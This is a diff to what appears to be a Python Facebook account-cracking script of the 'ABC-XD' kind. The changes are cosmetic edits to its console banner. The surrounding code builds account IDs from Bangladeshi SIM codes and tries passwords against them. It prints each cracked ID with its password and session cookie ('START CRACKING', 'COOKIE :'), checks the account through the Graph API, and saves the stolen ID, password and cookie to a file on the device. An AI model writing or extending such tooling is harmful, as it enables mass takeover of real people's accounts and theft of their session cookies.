@@ -3474,10 +3474,9 @@ def virusA():
 		os.system("clear")
 		print(logo)
 		tl = str(len(user))
-		print(' [+] COUNTRY    : Bangladesh')
-		print(' [+] TOTAL ID   :  '+tl)
-		print(f' [+] SIM CODE   : \033[1;92m {kode} ')
-		print(' [+] START CRACKING... ')
+		print('\x1b[38;5;46m[+] TOTAL ID   :\033[1;92m '+tl)
+		print(f'\x1b[38;5;46m[+] SIM CODE   :\033[1;92m {kode} ')
+		print('\x1b[38;5;46m[+] START CRACKING... ')
 		print(" \033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 		for guru in user:
 			uid = kode+koda+kodb+guru
@@ -3552,7 +3551,7 @@ def A(uid,pwx,tl):
                 cid=coki.split("c_user=")[1][:15].replace(";","")
                 xz = requests.get(f"https://graph.facebook.com/"+cid+"/picture?type=normal").text
                 if "Photoshop" in xz:
-                    print(f'\r\33[1;92m [ABC-XD-💚] '+cid+' | '+ps+'\33[0;92m')
+                    print(f'\r\33[1;92m [ABC-XD] '+cid+' | '+ps+'\33[0;92m')
                     print(f'\r\033[1;94m=[🌺]=COOKIE : '+coki)
                     oks.append(uid)
                     open('/sdcard/ABC-XD-ok.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
